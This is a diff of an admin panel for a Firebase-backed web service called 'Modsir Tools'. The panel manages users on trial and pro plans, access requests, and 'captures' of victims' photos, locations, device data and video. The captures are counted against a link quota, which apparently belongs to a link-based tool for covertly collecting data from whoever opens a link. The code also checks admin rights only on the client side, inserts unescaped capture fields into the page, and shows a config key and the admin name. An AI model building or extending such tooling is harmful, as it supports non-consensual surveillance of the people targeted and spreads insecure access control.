@@ -17,15 +17,15 @@
   .brand-logo{width:42px;height:42px;border-radius:11px;background:linear-gradient(135deg,var(--gold),#f59e0b);display:flex;align-items:center;justify-content:center;font-size:1.3rem;box-shadow:0 8px 24px rgba(251,191,36,0.4);color:#000;font-weight:800;}
   .brand-text{display:flex;flex-direction:column;line-height:1.1;}
   .brand-text small{font-size:0.6rem;letter-spacing:0.15em;text-transform:uppercase;color:var(--gold);}
-  .admin-badge{padding:6px 14px;border-radius:20px;background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;font-weight:700;font-size:0.75rem;letter-spacing:0.05em;}
+  .admin-badge{padding:6px 14px;border-radius:20px;background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;font-weight:700;font-size:0.75rem;}
   .card{background:var(--glass);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:22px;padding:24px;margin-bottom:18px;box-shadow:0 20px 50px rgba(0,0,0,0.4);}
   .card h2{font-family:'Space Grotesk',sans-serif;font-size:1.15rem;margin-bottom:16px;display:flex;align-items:center;gap:10px;}
   .card h2 .count-badge{padding:3px 10px;border-radius:20px;background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;font-size:0.7rem;font-weight:800;margin-left:auto;}
   button{padding:11px 20px;border-radius:10px;font-weight:600;font-size:0.85rem;cursor:pointer;transition:0.25s;font-family:inherit;border:none;display:inline-flex;align-items:center;justify-content:center;gap:6px;}
   button:active{transform:scale(0.97);}
-  button.primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;box-shadow:0 6px 20px rgba(34,211,238,0.35);}
+  button.primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;}
   button.gold{background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;box-shadow:0 6px 20px rgba(251,191,36,0.4);}
-  button.success{background:linear-gradient(135deg,var(--accent-3),#059669);color:#fff;box-shadow:0 6px 20px rgba(16,185,129,0.4);}
+  button.success{background:linear-gradient(135deg,var(--accent-3),#059669);color:#fff;}
   button.danger{background:rgba(239,68,68,0.15);color:#fca5a5;border:1px solid rgba(239,68,68,0.35);}
   button.secondary{background:var(--glass-2);color:#fff;border:1px solid var(--border-2);}
   button.small{padding:8px 14px;font-size:0.78rem;}
@@ -39,7 +39,7 @@
   .req-header{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;margin-bottom:12px;flex-wrap:wrap;}
   .req-info h4{font-family:'Space Grotesk',sans-serif;font-size:1rem;margin-bottom:4px;}
   .req-info p{font-size:0.8rem;opacity:0.7;}
-  .req-status{padding:5px 12px;border-radius:20px;font-size:0.7rem;font-weight:700;letter-spacing:0.05em;text-transform:uppercase;}
+  .req-status{padding:5px 12px;border-radius:20px;font-size:0.7rem;font-weight:700;text-transform:uppercase;}
   .req-status.pending{background:rgba(251,191,36,0.15);color:var(--gold);border:1px solid rgba(251,191,36,0.4);}
   .req-status.approved{background:rgba(16,185,129,0.15);color:var(--accent-3);border:1px solid rgba(16,185,129,0.4);}
   .req-status.rejected{background:rgba(239,68,68,0.15);color:#fca5a5;border:1px solid rgba(239,68,68,0.4);}
@@ -53,10 +53,6 @@
   .user-plan{padding:4px 10px;border-radius:20px;font-size:0.65rem;font-weight:700;text-transform:uppercase;}
   .user-plan.pro{background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;}
   .user-plan.trial{background:rgba(148,163,184,0.15);color:#cbd5e1;border:1px solid rgba(148,163,184,0.3);}
-  .stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:14px;}
-  .stat-box{background:linear-gradient(160deg,rgba(251,191,36,0.1),rgba(168,85,247,0.05));border:1px solid rgba(251,191,36,0.3);border-radius:16px;padding:20px 14px;text-align:center;}
-  .stat-box h3{font-family:'Space Grotesk',sans-serif;font-size:2rem;color:var(--gold);font-weight:800;}
-  .stat-box p{font-size:0.72rem;opacity:0.7;text-transform:uppercase;letter-spacing:0.06em;margin-top:4px;}
   .tabs{display:flex;gap:6px;background:rgba(0,0,0,0.4);border-radius:14px;padding:6px;margin-bottom:20px;border:1px solid var(--border);overflow-x:auto;}
   .tab{flex:1;min-width:120px;padding:11px;border-radius:10px;background:transparent;border:none;color:var(--text-dim);font-weight:600;font-size:0.85rem;cursor:pointer;font-family:inherit;white-space:nowrap;}
   .tab.active{background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;}
@@ -65,6 +61,8 @@
   .toast.error{background:linear-gradient(135deg,var(--danger),#b91c1c);}
   .empty-state{text-align:center;padding:40px 20px;opacity:0.5;}
   .empty-state .icon{font-size:3rem;margin-bottom:12px;}
+  .spinner{width:44px;height:44px;border:4px solid rgba(251,191,36,0.2);border-top-color:var(--gold);border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 16px;}
+  @keyframes spin{to{transform:rotate(360deg);}}
   @media (max-width:480px){.container{padding:14px 12px 30px;}.card{padding:18px;}}
 </style>
 </head>
@@ -76,66 +74,61 @@
     <div class="brand-text"><span>Admin Panel</span><small>Modsir Tools</small></div>
   </div>
   <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
-    <span class="admin-badge" id="adminEmail">malikmudasirkhar001</span>
+    <span class="admin-badge" id="adminEmail">...</span>
     <button class="danger small" onclick="adminLogout()">Logout</button>
   </div>
 </div>
 
 <div id="loadingView" class="container" style="text-align:center;padding-top:100px;">
-  <div style="width:44px;height:44px;border:4px solid rgba(251,191,36,0.2);border-top-color:var(--gold);border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 16px;"></div>
-  <p style="opacity:0.6;">Loading admin panel...</p>
+  <div class="spinner"></div>
+  <p style="opacity:0.6;">Verifying admin access...</p>
 </div>
 
 <div id="adminView" class="container hidden">
   <div class="tabs">
     <button class="tab active" onclick="switchTab('overview', this)">📊 Overview</button>
-    <button class="tab" onclick="switchTab('requests', this)">📩 Requests <span id="reqCount">0</span></button>
+    <button class="tab" onclick="switchTab('requests', this)">📩 Requests <span id="reqCount"></span></button>
     <button class="tab" onclick="switchTab('users', this)">👥 Users</button>
-    <button class="tab" onclick="switchTab('captures', this)">🖼️ All Captures</button>
+    <button class="tab" onclick="switchTab('captures', this)">🖼️ Captures</button>
   </div>
 
-  <!-- OVERVIEW TAB -->
   <div id="tab-overview">
     <div class="stats">
       <div class="stat-box"><h3 id="sUsers">0</h3><p>Total Users</p></div>
       <div class="stat-box"><h3 id="sPro">0</h3><p>Pro Users</p></div>
-      <div class="stat-box"><h3 id="sPending">0</h3><p>Pending Requests</p></div>
-      <div class="stat-box"><h3 id="sCaptures">0</h3><p>Total Captures</p></div>
+      <div class="stat-box"><h3 id="sPending">0</h3><p>Pending</p></div>
+      <div class="stat-box"><h3 id="sCaptures">0</h3><p>Captures</p></div>
     </div>
-
     <div class="card">
       <h2>🚀 Quick Actions</h2>
       <div style="display:flex;gap:10px;flex-wrap:wrap;">
-        <button class="gold small" onclick="location.href='index.html'">🏠 Visit Website</button>
+        <button class="gold small" onclick="location.href='index.html'">🏠 Website</button>
         <button class="secondary small" onclick="location.href='dashboard.html'">📊 My Dashboard</button>
-        <button class="primary small" onclick="refreshAll()">🔄 Refresh Data</button>
+        <button class="primary small" onclick="refreshAll()">🔄 Refresh</button>
       </div>
     </div>
   </div>
 
-  <!-- REQUESTS TAB -->
   <div id="tab-requests" class="hidden">
     <div class="card">
       <h2>📩 Full Access Requests <span class="count-badge" id="reqBadge">0</span></h2>
-      <p style="opacity:0.7;font-size:0.85rem;margin-bottom:16px;">Users ki Full Access requests yahan dikhengi. Approve karne se unhe Pro plan mil jayega.</p>
+      <p style="opacity:0.7;font-size:0.85rem;margin-bottom:16px;">Users ki Full Access requests. Approve karne se Pro plan mil jayega.</p>
       <div id="requestsList"></div>
     </div>
   </div>
 
-  <!-- USERS TAB -->
   <div id="tab-users" class="hidden">
     <div class="card">
       <h2>👥 All Users <span class="count-badge" id="userBadge">0</span></h2>
-      <input type="search" id="userSearch" placeholder="🔍 Search by name, email..." oninput="renderUsers()">
+      <input type="search" id="userSearch" placeholder="🔍 Search..." oninput="renderUsers()">
       <div id="usersList"></div>
     </div>
   </div>
 
-  <!-- CAPTURES TAB -->
   <div id="tab-captures" class="hidden">
     <div class="card">
       <h2>🖼️ All Captures <span class="count-badge" id="captureBadge">0</span></h2>
-      <input type="search" id="captureSearch" placeholder="🔍 Search captures..." oninput="renderAllCaptures()">
+      <input type="search" id="captureSearch" placeholder="🔍 Search..." oninput="renderAllCaptures()">
       <div id="capturesList" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;"></div>
     </div>
   </div>
@@ -146,7 +139,7 @@
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
 import { getAuth, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-import { getFirestore, collection, getDocs, doc, query, where, getDoc, updateDoc, deleteDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+import { getFirestore, collection, getDocs, doc, updateDoc, deleteDoc, onSnapshot, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyBW17Z4J5ru9EbpiEfygz_Dpj8ekJuKqBg",
@@ -169,6 +162,7 @@ let allCaptures = [];
 let unsubUsers = null;
 let unsubRequests = null;
 let unsubCaptures = null;
+let adminVerified = false;
 
 window.showToast = function(msg, isError = false) {
   const t = document.getElementById("toast");
@@ -178,11 +172,32 @@ window.showToast = function(msg, isError = false) {
   t._to = setTimeout(() => t.className = "toast", 3500);
 }
 
+/* ========== AUTH CHECK - FIXED ========== */
 onAuthStateChanged(auth, async (user) => {
-  if (!user || user.email !== ADMIN_EMAIL) {
-    location.href = "index.html";
+  console.log("Auth state:", user ? user.email : "no user");
+
+  // No user - wait a bit then redirect
+  if (!user) {
+    setTimeout(() => {
+      if (!auth.currentUser) {
+        console.log("No user, redirecting to index");
+        location.href = "index.html";
+      }
+    }, 1500);
     return;
   }
+
+  // Check admin email
+  if (user.email !== ADMIN_EMAIL) {
+    console.log("Not admin:", user.email);
+    showToast("You are not admin", true);
+    setTimeout(() => location.href = "dashboard.html", 800);
+    return;
+  }
+
+  // ✅ Admin verified
+  adminVerified = true;
+  console.log("Admin verified:", user.email);
 
   document.getElementById("adminEmail").textContent = user.email.split("@")[0];
   document.getElementById("loadingView").classList.add("hidden");
@@ -192,28 +207,25 @@ onAuthStateChanged(auth, async (user) => {
 });
 
 async function startListeners() {
-  // Users listener
   unsubUsers = onSnapshot(collection(db, "users"), (snap) => {
     allUsers = snap.docs.map(d => ({ id: d.id, ...d.data() }));
     renderUsers();
     updateStats();
-  });
+  }, err => console.error("users err:", err));
 
-  // Requests listener
   unsubRequests = onSnapshot(collection(db, "requests"), (snap) => {
     allRequests = snap.docs.map(d => ({ id: d.id, ...d.data() }));
     allRequests.sort((a,b) => (b.createdAt?.seconds||0) - (a.createdAt?.seconds||0));
     renderRequests();
     updateStats();
-  });
+  }, err => console.error("req err:", err));
 
-  // Captures listener
   unsubCaptures = onSnapshot(collection(db, "captures"), (snap) => {
     allCaptures = snap.docs.map(d => ({ id: d.id, ...d.data() }));
     allCaptures.sort((a,b) => (b.timestamp?.seconds||0) - (a.timestamp?.seconds||0));
     renderAllCaptures();
     updateStats();
-  });
+  }, err => console.error("cap err:", err));
 }
 
 function updateStats() {
@@ -238,7 +250,7 @@ window.switchTab = function(tab, el) {
   document.getElementById("tab-" + tab).classList.remove("hidden");
 }
 
-/* ===== RENDER REQUESTS ===== */
+/* ===== REQUESTS ===== */
 function renderRequests() {
   const list = document.getElementById("requestsList");
   if (allRequests.length === 0) {
@@ -247,22 +259,18 @@ function renderRequests() {
   }
   list.innerHTML = allRequests.map(r => {
     const status = r.status || "pending";
-    const statusClass = status;
     const statusLabel = status === "pending" ? "⏳ Pending" : status === "approved" ? "✅ Approved" : "❌ Rejected";
     const time = r.createdAt?.seconds ? new Date(r.createdAt.seconds*1000).toLocaleString() : "-";
-
     let actions = "";
     if (status === "pending") {
       actions = `
         <button class="success small" onclick="approveRequest('${r.id}', '${r.userId}')">✅ Approve</button>
-        <button class="danger small" onclick="rejectRequest('${r.id}')">❌ Reject</button>
-      `;
+        <button class="danger small" onclick="rejectRequest('${r.id}')">❌ Reject</button>`;
     } else if (status === "approved") {
-      actions = `<button class="danger small" onclick="rejectRequest('${r.id}')">Revoke (Reject)</button>`;
-    } else if (status === "rejected") {
-      actions = `<button class="success small" onclick="approveRequest('${r.id}', '${r.userId}')">Approve Now</button>`;
+      actions = `<button class="danger small" onclick="rejectRequest('${r.id}')">Revoke</button>`;
+    } else {
+      actions = `<button class="success small" onclick="approveRequest('${r.id}', '${r.userId}')">Approve</button>`;
     }
-
     return `
       <div class="req-item">
         <div class="req-header">
@@ -271,24 +279,21 @@ function renderRequests() {
             <p>${escapeHtml(r.userEmail || "")}</p>
             <p style="font-size:0.72rem;opacity:0.5;margin-top:4px;">🕒 ${time}</p>
           </div>
-          <span class="req-status ${statusClass}">${statusLabel}</span>
+          <span class="req-status ${status}">${statusLabel}</span>
         </div>
         ${r.message ? `<p style="font-size:0.82rem;opacity:0.7;margin-bottom:12px;">"${escapeHtml(r.message)}"</p>` : ""}
         <div class="req-actions">${actions}</div>
-      </div>
-    `;
+      </div>`;
   }).join("");
 }
 
 window.approveRequest = async function(reqId, userId) {
-  if (!confirm("Approve this request? User will get full Pro access.")) return;
+  if (!confirm("Approve this request? User will get Pro plan.")) return;
   try {
     await updateDoc(doc(db, "requests", reqId), { status: "approved", approvedAt: new Date() });
     await updateDoc(doc(db, "users", userId), { plan: "pro" });
-    showToast("✅ User approved! Full access mil gaya.");
-  } catch (e) {
-    showToast("Approve fail: " + e.message, true);
-  }
+    showToast("✅ Approved! User is now Pro.");
+  } catch (e) { showToast("Fail: " + e.message, true); }
 }
 
 window.rejectRequest = async function(reqId) {
@@ -296,23 +301,19 @@ window.rejectRequest = async function(reqId) {
   try {
     await updateDoc(doc(db, "requests", reqId), { status: "rejected" });
     showToast("Request rejected");
-  } catch (e) {
-    showToast("Reject fail: " + e.message, true);
-  }
+  } catch (e) { showToast("Fail: " + e.message, true); }
 }
 
-/* ===== RENDER USERS ===== */
+/* ===== USERS ===== */
 function renderUsers() {
   const list = document.getElementById("usersList");
   const search = (document.getElementById("userSearch")?.value || "").toLowerCase();
   let filtered = allUsers;
   if (search) filtered = filtered.filter(u => (u.name||"").toLowerCase().includes(search) || (u.email||"").toLowerCase().includes(search));
-
   if (filtered.length === 0) {
     list.innerHTML = `<div class="empty-state"><div class="icon">👥</div><p>Koi user nahi mila</p></div>`;
     return;
   }
-
   list.innerHTML = filtered.map(u => {
     const initials = (u.name || u.email || "U")[0].toUpperCase();
     const plan = u.plan || "trial";
@@ -328,42 +329,35 @@ function renderUsers() {
         <div style="display:flex;gap:6px;flex-wrap:wrap;">
           ${plan === "trial" ? `<button class="success small" onclick="makePro('${u.id}')">Make Pro</button>` : `<button class="danger small" onclick="makeTrial('${u.id}')">Demote</button>`}
         </div>
-      </div>
-    `;
+      </div>`;
   }).join("");
 }
 
 window.makePro = async function(userId) {
-  if (!confirm("Make this user Pro?")) return;
-  try {
-    await updateDoc(doc(db, "users", userId), { plan: "pro" });
-    showToast("User is now Pro 👑");
-  } catch (e) { showToast("Fail: " + e.message, true); }
+  if (!confirm("Make Pro?")) return;
+  try { await updateDoc(doc(db, "users", userId), { plan: "pro" }); showToast("Pro 👑"); }
+  catch (e) { showToast("Fail", true); }
 }
 
 window.makeTrial = async function(userId) {
-  if (!confirm("Demote this user to Trial?")) return;
-  try {
-    await updateDoc(doc(db, "users", userId), { plan: "trial", linksUsed: 0 });
-    showToast("User demoted to Trial");
-  } catch (e) { showToast("Fail: " + e.message, true); }
+  if (!confirm("Demote to Trial?")) return;
+  try { await updateDoc(doc(db, "users", userId), { plan: "trial", linksUsed: 0 }); showToast("Trial"); }
+  catch (e) { showToast("Fail", true); }
 }
 
-/* ===== RENDER CAPTURES ===== */
+/* ===== CAPTURES ===== */
 function renderAllCaptures() {
   const list = document.getElementById("capturesList");
   const search = (document.getElementById("captureSearch")?.value || "").toLowerCase();
   let filtered = allCaptures;
   if (search) filtered = filtered.filter(c => JSON.stringify(c).toLowerCase().includes(search));
-
   if (filtered.length === 0) {
     list.innerHTML = `<div class="empty-state" style="grid-column:1/-1;"><div class="icon">🖼️</div><p>Koi capture nahi mila</p></div>`;
     return;
   }
-
   list.innerHTML = filtered.map(c => {
     let thumb = "";
-    if (c.photo) thumb = `<img src="${c.photo}" onclick="viewCapture('${c.id}')" loading="lazy">`;
+    if (c.photo) thumb = `<img src="${c.photo}" onclick="viewCapture('${c.id}')" loading="lazy" style="width:100%;aspect-ratio:1;object-fit:cover;cursor:pointer;background:#000;">`;
     else if (c.type === "location") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(34,211,238,0.1);">📍</div>`;
     else if (c.type === "device") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(168,85,247,0.1);">📱</div>`;
     else if (c.type === "video") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(239,68,68,0.1);">🎥</div>`;
@@ -372,10 +366,9 @@ function renderAllCaptures() {
     const owner = allUsers.find(u => u.id === c.ownerId);
     const ownerName = owner?.name || owner?.email?.split("@")[0] || "Unknown";
     const time = c.timestamp?.seconds ? new Date(c.timestamp.seconds*1000).toLocaleString() : "-";
-
     return `
       <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:14px;overflow:hidden;">
-        ${thumb.replace('style="aspect-ratio:1;', 'style="width:100%;aspect-ratio:1;object-fit:cover;')}
+        ${thumb}
         <div style="padding:10px 12px;font-size:0.72rem;line-height:1.5;">
           <div>👤 ${escapeHtml(ownerName)}</div>
           <div>🏷️ ${c.type || c.feature}</div>
@@ -384,8 +377,7 @@ function renderAllCaptures() {
         <div style="padding:0 10px 10px;">
           <button class="danger small" style="width:100%;padding:6px;font-size:0.7rem;" onclick="deleteCapture('${c.id}')">Delete</button>
         </div>
-      </div>
-    `;
+      </div>`;
   }).join("");
 }
 
@@ -398,17 +390,12 @@ window.viewCapture = function(id) {
 }
 
 window.deleteCapture = async function(id) {
-  if (!confirm("Delete this capture?")) return;
-  try {
-    await deleteDoc(doc(db, "captures", id));
-    showToast("Deleted 🗑️");
-  } catch (e) { showToast("Fail", true); }
+  if (!confirm("Delete?")) return;
+  try { await deleteDoc(doc(db, "captures", id)); showToast("Deleted 🗑️"); }
+  catch (e) { showToast("Fail", true); }
 }
 
-window.refreshAll = function() {
-  showToast("Data refreshing...");
-  location.reload();
-}
+window.refreshAll = function() { location.reload(); }
 
 window.adminLogout = async function() {
   if (unsubUsers) unsubUsers();
